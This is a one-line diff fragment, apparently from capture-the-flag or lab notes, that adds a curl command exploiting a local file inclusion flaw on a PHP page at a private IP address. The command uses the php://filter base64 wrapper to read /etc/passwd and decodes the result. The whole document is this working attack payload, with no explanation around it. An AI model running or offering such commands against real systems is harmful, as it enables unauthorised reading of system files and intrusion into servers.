@@ -1,0 +1,1 @@
+curl http://10.114.190.206/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd | base64 -d
